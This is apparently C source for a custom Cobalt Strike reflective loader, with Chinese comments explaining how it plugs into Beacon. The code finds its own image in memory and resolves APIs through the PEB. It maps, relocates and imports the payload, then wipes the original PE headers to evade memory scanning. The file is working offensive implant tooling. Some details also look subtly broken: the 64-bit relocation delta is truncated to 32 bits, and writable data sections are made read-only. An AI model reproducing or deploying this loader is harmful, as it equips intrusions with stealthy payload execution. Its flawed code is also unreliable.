/*
 * cs_dev :: udrl.x64  (User-Defined Reflective Loader)
 * ---------------------------------------------------------------------------
 * Cobalt Strike 4.x 自定义反射加载器
 *
 * CS 集成机制 (依据 pe/BeaconRDLL.java 反向确认):
 *   1. CS 读取本文件编译出的 COFF, 取 .text 段机器码, 循环填充到 5120 字节
 *      (getReflectiveLoaderFunction: AssertUtils.TestRange(codeSize, 1024, 5120))
 *   2. ReflectiveDLL.setReflectiveLoader 把该代码写入 Beacon DLL 的
 *      ReflectiveLoader 位置 (DLL 内必须存在该导出, 否则 offset 断言失败)
 *   3. 运行时本加载器从 DLL 原始镜像内部执行, 通过 call/pop 取得 RIP,
 *      向低地址按页搜索 MZ/PE 签名定位自身镜像基址
 *   4. loader 选型由 profile 的 .stage.allocator 决定:
 *        HeapAlloc      -> BeaconLoader.HA.{arch}.o
 *        MapViewOfFile  -> BeaconLoader.MVF.{arch}.o
 *        VirtualAlloc   -> BeaconLoader.VA.{arch}.o   (默认, 本实现)
 *   5. CS 把代码中的 MZ/PE 签名字节替换为 profile 的 magic_mz_{arch} / magic_pe
 *      (fixLoaderMZ / fixLoaderPE), 因此签名比较必须写成立即数比较形式,
 *      让编译器自然产出 "MZ\0\0" + jne 与 "PE\0\0" + jne 字节序列
 *
 * 硬性约束:
 *   - 位置无关代码 (PIC), 无绝对地址引用, 无 CRT 依赖
 *   - .text 段大小需落在 1024..5120 字节
 *
 * 相对 CS 内置 loader 的增强:
 *   - 新镜像分段权限: 无 RWX, 可执行段仅 PAGE_EXECUTE_READ
 *   - 映射完成后擦除原始镜像头部, 消除 MZ/PE 扫描锚点
 *   - 导入与重定位全部自行处理, 不依赖 LoadLibrary 的隐式行为
 * ---------------------------------------------------------------------------
 */
#include <windows.h>

/* ======================================================================
 * 签名副本 (与代码中的立即数比较使用同一组值)
 * 置于 .text 段, 保证被 BeaconRDLL.getCode() 收集, 并接受 CS 的 magic patch
 * ==================================================================== */
__attribute__((section(".text"), used))
static const unsigned char g_mz_sig[5] = { 0x4D, 0x5A, 0x00, 0x00, 0x75 };
__attribute__((section(".text"), used))
static const unsigned char g_pe_sig[6] = { 0x50, 0x45, 0x00, 0x00, 0x75, 0x02 };

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;
typedef unsigned long long uptr;

/* ---------------- 最小 PE 结构 (x64) ---------------- */
typedef struct {
    u16 e_magic;
    u16 e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc;
    u16 e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
    u16 e_res[4];
    u16 e_oemid, e_oeminfo;
    u16 e_res2[10];
    u32 e_lfanew;
} DOS_HDR;

typedef struct {
    u16 Machine;
    u16 NumberOfSections;
    u32 TimeDateStamp;
    u32 PointerToSymbolTable;
    u32 NumberOfSymbols;
    u16 SizeOfOptionalHeader;
    u16 Characteristics;
} FILE_HDR;

typedef struct { u32 VirtualAddress; u32 Size; } DATA_DIR;

typedef struct {
    u16 Magic;
    u8  MajorLinkerVersion, MinorLinkerVersion;
    u32 SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
    u32 AddressOfEntryPoint;
    u32 BaseOfCode;
    u64 ImageBase;
    u32 SectionAlignment, FileAlignment;
    u16 MajorOSVersion, MinorOSVersion, MajorImageVersion, MinorImageVersion;
    u16 MajorSubsystemVersion, MinorSubsystemVersion;
    u32 Win32VersionValue;
    u32 SizeOfImage, SizeOfHeaders, CheckSum;
    u16 Subsystem, DllCharacteristics;
    u64 SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
    u32 LoaderFlags;
    u32 NumberOfRvaAndSizes;
    DATA_DIR DataDirectory[16];
} OPT_HDR64;

typedef struct {
    u8  Name[8];
    u32 VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData;
    u32 PointerToRelocations, PointerToLinenumbers;
    u16 NumberOfRelocations, NumberOfLinenumbers;
    u32 Characteristics;
} SEC_HDR;

typedef struct { u32 VirtualAddress; u32 SizeOfBlock; } BASE_RELOC;

typedef struct {
    u32 OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk;
} IMPORT_DESC;

/* 注意: 版本号为两个 u16, 其后才是 5 个 u32 索引字段 */
typedef struct {
    u32 Characteristics;
    u32 TimeDateStamp;
    u16 MajorVersion;
    u16 MinorVersion;
    u32 Name;
    u32 Base;
    u32 NumberOfFunctions;
    u32 NumberOfNames;
    u32 AddressOfFunctions;
    u32 AddressOfNames;
    u32 AddressOfNameOrdinals;
} EXPORT_DESC;

/* ---------------- API 表 ---------------- */
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pDllMain_t)(HINSTANCE, DWORD, LPVOID);

typedef struct {
    pLoadLibraryA   LoadLibraryA;
    pGetProcAddress GetProcAddress;
    pVirtualAlloc   VirtualAlloc;
    pVirtualProtect VirtualProtect;
} API_SET;

/* ---------------- 工具函数 ---------------- */
static int eq_upper(const char *a, const char *b) {
    int i = 0;
    for (;;) {
        char ca = a[i], cb = b[i];
        if (ca >= 'a' && ca <= 'z') ca = (char)(ca - 32);
        if (cb >= 'a' && cb <= 'z') cb = (char)(cb - 32);
        if (ca != cb) return 0;
        if (!ca) return 1;
        if (++i > 96) return 0;
    }
}

/* 取当前指令地址 (PIC, call/pop) */
static u8 *get_ip(void) {
    u8 *p;
    __asm__ __volatile__("call 1f\n\t1: pop %0" : "=r"(p));
    return p;
}

static uptr get_peb(void) {
    uptr p;
#if defined(_WIN64)
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(p));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(p));
#endif
    return p;
}

/* PEB -> InLoadOrderModuleList 遍历 (x64) */
static uptr find_module(const char *name) {
    uptr peb = get_peb(), ldr, head, cur;
    int  guard = 0;
    if (!peb) return 0;
#if defined(_WIN64)
    ldr  = *(uptr *)(peb + 0x18);
    if (!ldr) return 0;
    head = ldr + 0x10;
#else
    ldr  = *(uptr *)(peb + 0x0C);
    if (!ldr) return 0;
    head = ldr + 0x0C;
#endif
    cur = *(uptr *)head;
    while (cur != head && guard++ < 256) {
#if defined(_WIN64)
        uptr dllbase = *(uptr *)(cur + 0x30);
        u16  len     = *(u16  *)(cur + 0x58);
        uptr buf     = *(uptr *)(cur + 0x60);
#else
        uptr dllbase = *(uptr *)(cur + 0x18);
        u16  len     = *(u16  *)(cur + 0x2C);
        uptr buf     = *(uptr *)(cur + 0x30);
#endif
        if (buf && len >= 2 && len < 256) {
            char an[128];
            int  i, n = len / 2;
            if (n > 127) n = 127;
            for (i = 0; i < n; i++) an[i] = (char)(*(u16 *)(buf + i * 2) & 0xFF);
            an[n] = 0;
            if (eq_upper(an, name)) return dllbase;
        }
        cur = *(uptr *)cur;
    }
    return 0;
}

/* 导出表解析 */
static uptr get_export(uptr base, const char *name) {
    DOS_HDR     *dos = (DOS_HDR *)base;
    uptr         nt, opt;
    DATA_DIR    *dir;
    EXPORT_DESC *exp;
    u32         *names, *funcs;
    u16         *ords;
    u32          i;

    if (!base || dos->e_magic != 0x5A4D) return 0;
    nt  = base + dos->e_lfanew;
    if (*(u32 *)nt != 0x00004550) return 0;
    opt = nt + 4 + 20;
#if defined(_WIN64)
    dir = (DATA_DIR *)(opt + 112);
#else
    dir = (DATA_DIR *)(opt + 96);
#endif
    if (!dir[0].VirtualAddress) return 0;

    exp   = (EXPORT_DESC *)(base + dir[0].VirtualAddress);
    names = (u32 *)(base + exp->AddressOfNames);
    ords  = (u16 *)(base + exp->AddressOfNameOrdinals);
    funcs = (u32 *)(base + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames && i < 8192; i++) {
        char *fn = (char *)(base + names[i]);
        if (eq_upper(fn, name)) return base + funcs[ords[i]];
    }
    return 0;
}

static int resolve_apis(API_SET *api) {
    uptr k32 = find_module("KERNEL32.DLL");
    if (!k32) k32 = find_module("KERNEL32");
    if (!k32) return 0;
    api->LoadLibraryA   = (pLoadLibraryA)   get_export(k32, "LoadLibraryA");
    api->GetProcAddress = (pGetProcAddress) get_export(k32, "GetProcAddress");
    api->VirtualAlloc   = (pVirtualAlloc)   get_export(k32, "VirtualAlloc");
    api->VirtualProtect = (pVirtualProtect) get_export(k32, "VirtualProtect");
    return api->LoadLibraryA && api->GetProcAddress && api->VirtualAlloc;
}

static void clear_mem(u8 *p, u32 n) {
    u32 i;
    for (i = 0; i < n; i++) p[i] = 0;
}

/* ======================================================================
 * 主入口
 * ==================================================================== */
__declspec(dllexport) void *ReflectiveLoader(void *param) {
    API_SET   api;
    u8       *here, *base = 0, *image = 0;
    DOS_HDR  *dos;
    uptr      nt;
    FILE_HDR *fh;
    OPT_HDR64 *oh;
    SEC_HDR  *secs;
    u32       i, delta;

    (void)param;

    /* 1. 定位自身原始镜像: 从当前地址向低地址按页搜索 */
    here = get_ip();
    {
        uptr p = ((uptr)here) & ~(uptr)0xFFF;
        int  guard = 0;
        while (p > 0x10000 && guard++ < 16384) {
            DOS_HDR *d = (DOS_HDR *)p;
            if (d->e_magic == 0x5A4D) {                     /* "MZ" 立即数比较 */
                uptr n = p + d->e_lfanew;
                if (n > p && n < p + 0x1000 && *(u32 *)n == 0x00004550) {
                    base = (u8 *)p;
                    break;
                }
            }
            p -= 0x1000;
        }
    }
    if (!base) return 0;

    /* 2. 解析 PE 头 */
    dos  = (DOS_HDR *)base;
    nt   = (uptr)base + dos->e_lfanew;
    if (*(u32 *)nt != 0x00004550) return 0;                 /* "PE\0\0" */
    fh   = (FILE_HDR *)(nt + 4);
    oh   = (OPT_HDR64 *)(nt + 4 + 20);
    secs = (SEC_HDR *)((u8 *)oh + fh->SizeOfOptionalHeader);
    if (!oh->SizeOfImage) return 0;

    if (!resolve_apis(&api)) return 0;

    /* 3. 分配新镜像 (先 RW) */
    image = (u8 *)api.VirtualAlloc(0, oh->SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!image) return 0;

    /* 4. 拷贝头部与各节 */
    for (i = 0; i < oh->SizeOfHeaders; i++) image[i] = base[i];
    for (i = 0; i < fh->NumberOfSections; i++) {
        u8 *src = base + secs[i].PointerToRawData;
        u8 *dst = image + secs[i].VirtualAddress;
        u32 n = secs[i].SizeOfRawData, j;
        if (!n || !secs[i].VirtualAddress) continue;
        for (j = 0; j < n; j++) dst[j] = src[j];
    }

    /* 5. 重定位 */
    delta = (u32)((uptr)image - (uptr)oh->ImageBase);
    if (oh->DataDirectory[5].VirtualAddress && delta) {
        u8 *rel = image + oh->DataDirectory[5].VirtualAddress;
        u8 *end = rel + oh->DataDirectory[5].Size;
        while (rel + 8 <= end) {
            BASE_RELOC *blk = (BASE_RELOC *)rel;
            u16  num, k;
            u16 *ent;
            if (blk->SizeOfBlock < 8) break;
            num = (u16)((blk->SizeOfBlock - 8) / 2);
            ent = (u16 *)(rel + 8);
            for (k = 0; k < num; k++) {
                u16 type = (u16)(ent[k] >> 12);
                u16 off  = (u16)(ent[k] & 0x0FFF);
                u8 *tgt  = image + blk->VirtualAddress + off;
#if defined(_WIN64)
                if (type == 10) *(u64 *)tgt += delta;
#else
                if (type == 3)  *(u32 *)tgt += delta;
#endif
            }
            rel += blk->SizeOfBlock;
        }
    }

    /* 6. 导入表 */
    if (oh->DataDirectory[1].VirtualAddress) {
        IMPORT_DESC *imp = (IMPORT_DESC *)(image + oh->DataDirectory[1].VirtualAddress);
        while (imp->Name) {
            HMODULE mod = api.LoadLibraryA((char *)(image + imp->Name));
            if (mod) {
                uptr *thunk = (uptr *)(image + (imp->OriginalFirstThunk
                                                ? imp->OriginalFirstThunk
                                                : imp->FirstThunk));
                uptr *iat   = (uptr *)(image + imp->FirstThunk);
                while (*thunk) {
                    uptr v = *thunk;
                    if (!(v & 0x8000000000000000ULL)) {
                        char *fn = (char *)(image + (u32)v + 2);   /* skip Hint/Ordinal */
                        *iat = (uptr)api.GetProcAddress(mod, fn);
                    }
                    thunk++; iat++;
                }
            }
            imp++;
        }
    }

    /* 7. 分段权限: 全程无 RWX */
    for (i = 0; i < fh->NumberOfSections; i++) {
        DWORD ch = secs[i].Characteristics, prot, old;
        u32   sz = secs[i].VirtualSize ? secs[i].VirtualSize : secs[i].SizeOfRawData;
        if (!secs[i].VirtualAddress || !sz) continue;
        if (ch & 0x80000000)      prot = PAGE_EXECUTE_READ;   /* CNT_CODE */
        else if (ch & 0x20000000) prot = PAGE_READWRITE;      /* CNT_UNINIT_DATA */
        else if (ch & 0x40000000) prot = PAGE_READONLY;       /* CNT_INIT_DATA */
        else                      prot = PAGE_READONLY;
        api.VirtualProtect(image + secs[i].VirtualAddress, sz, prot, &old);
    }

    /* 8. 擦除原始镜像头部 (反扫描) */
    clear_mem(base, oh->SizeOfHeaders > 0x1000 ? 0x1000 : oh->SizeOfHeaders);

    /* 9. 调用入口 */
    if (oh->AddressOfEntryPoint) {
        pDllMain_t entry = (pDllMain_t)(image + oh->AddressOfEntryPoint);
        entry((HINSTANCE)image, 1 /* DLL_PROCESS_ATTACH */, 0);
    }
    return (void *)image;
}

/* 与原版 loader 保持一致的辅助导出 */
__declspec(dllexport) void *caller(void) {
    return get_ip();
}
